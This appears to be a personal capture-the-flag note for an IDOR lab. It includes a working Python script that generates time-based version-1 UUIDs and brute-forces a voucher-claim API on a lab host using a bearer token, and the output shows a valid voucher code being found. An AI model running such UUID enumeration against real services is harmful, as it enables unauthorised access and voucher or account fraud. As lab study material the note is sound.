
Screenshots in [[../../../Tools n Info/05 - Web Exploration/Vulnerabilities/IDOR|IDOR]]

### Base 64

![[Images/Pasted image 20251209204306.png]]

![[Images/Pasted image 20251209204416.png]]
### MD5

![[Images/Pasted image 20251209204456.png]]

![[Images/Pasted image 20251209204334.png]]
### UUID

login (to get a new token :) ):
![[Images/Pasted image 20251209204054.png]]

![[Images/Pasted image 20251209204758.png]]

```python
import datetime
import requests
import json

NODE = 0x026ccdf7d769
AUTH = "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOjEwLCJyb2xlIjoxLCJleHAiOjE3NjUzMDM3NTN9.svoCKLyT3f-AyPIF2kUjUkxvoThJD3S46QDqFTBVyO0"
TARGET = "http://10.82.154.123/api/parents/vouchers/claim"

headers = {
    "Host": "10.82.154.123",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
    "Accept": "*/*",
    "Accept-Language": "en-US,en;q=0.5",
 #   "Accept-Encoding": "gzip, deflate, br",
    "Referer": "http://10.82.154.123/",
    "Origin": "http://10.82.154.123",
    "Authorization": AUTH,
    "Content-Type": "application/json",
#    "Connection": "keep-alive",
}

def uuid1_from_dt(dt, node, clock_seq):
    uuid_epoch = datetime.datetime(1582, 10, 15, tzinfo=datetime.timezone.utc)
    delta = dt - uuid_epoch
    ts = int(delta.total_seconds() * 10_000_000)

    time_low = ts & 0xffffffff
    time_mid = (ts >> 32) & 0xffff
    time_hi = (ts >> 48) & 0x0fff
    time_hi |= (1 << 12)

    clock_seq &= 0x3fff
    clock_seq_hi = (clock_seq >> 8) | 0x80
    clock_seq_lo = clock_seq & 0xff

    return "%08x-%04x-%04x-%02x%02x-%012x" % (
        time_low, time_mid, time_hi, clock_seq_hi, clock_seq_lo, node
    )

start = datetime.datetime(2025, 11, 20, 20, 0, tzinfo=datetime.timezone.utc)
end   = datetime.datetime(2025, 11, 21, 0, 0, tzinfo=datetime.timezone.utc)

cur = start
while cur <= end:
    code = uuid1_from_dt(cur, NODE, 0xac99)  # using the number from the first voucher on "our" users list
    print("Trying:", code)

    r = requests.post(
        TARGET,
        headers=headers,
        data=json.dumps({"code": code})
    )

    if r.status_code == 200:
        print("status:", r.status_code)
        print("FOUND:", code)
        print("Response:", r.text)
        break
    else:
        print("status:", r.status_code)
        print("Response:", r.text)

    cur += datetime.timedelta(minutes=1)

print("Done.")

```

```sh
┌──(fixit42㉿kali)-[~/boxes/thm/aoc2025-day5]
└─$ python3 try-uuids.py
Trying: 7ec26000-c64b-11f0-ac99-026ccdf7d769
status: 404
Response: {"detail":"Voucher not found"}
Trying: a285a600-c64b-11f0-ac99-026ccdf7d769
status: 404
Response: {"detail":"Voucher not found"}
Trying: c648ec00-c64b-11f0-ac99-026ccdf7d769
status: 404
Response: {"detail":"Voucher not found"}
Trying: ea0c3200-c64b-11f0-ac99-026ccdf7d769
status: 404
...
Response: {"detail":"Voucher not found"}
Trying: daddb200-c654-11f0-ac99-026ccdf7d769
status: 404
Response: {"detail":"Voucher not found"}
Trying: fea0f800-c654-11f0-ac99-026ccdf7d769
status: 404
Response: {"detail":"Voucher not found"}
Trying: 22643e00-c655-11f0-ac99-026ccdf7d769
status: 200
FOUND: 22643e00-c655-11f0-ac99-026ccdf7d769
Response: {"voucher_id":22,"code":"22643e00-c655-11f0-ac99-026ccdf7d769","extra_count":1,"created_at":"2025-10-10T10:24:14+00:00"}
Done.

```